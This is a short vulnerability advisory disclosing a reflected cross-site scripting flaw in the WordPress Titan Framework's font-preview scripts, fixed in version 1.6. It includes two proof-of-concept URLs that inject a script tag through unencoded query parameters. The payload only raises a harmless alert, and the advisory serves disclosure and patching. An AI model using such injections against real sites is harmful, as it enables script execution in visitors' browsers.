## Titan Framework 1.0.1 - 1.5.2, Reflected XSS

The Titan Framework contains a file in its repository which is distributed with the version obtained from âwordpress.orgâ, named âiframe-googlefont-preview.phpâ. The intention of this file is to allow users to preview fonts included from the Google Fonts service, with either the default string of âGrumpy wizards make toxic brew for the evil Queen and Jackâ, or a string of their choosing via the âtâ QSA. The âtâ QSA is simply output, without any processing or encoding, which results in a Reflected XSS attack being possible. A second script named âiframe-font-preview.phpâ is also vulnerable, using the âtextâ QSA.
The wide usage of the Titan Framework means that a large number of plugins are vulnerable, simply due to their usage of the Titan Framework in their plugin.

### Attack Scope

remote

### Authorization Required

None

### Mitigation

Update TitanFramework to 1.6

### Proof of Concept

The following URL results in the content âalert(â.â);â being output to the users browser.

```
http://localhost/wp-content/plugins/<path to titan framework>/iframe-googlefont-preview.php?f=Arial&t=<script type="text/javascript">alert(".");</script>
```

Alternatively, a second script named âiframe-font-preview.phpâ can be exploited as follows.

```
http://localhost/wp-content/plugins/<path to titan framework>/iframe-font-preview.php?text=<script type="text/javascript">alert(".");</script>
```
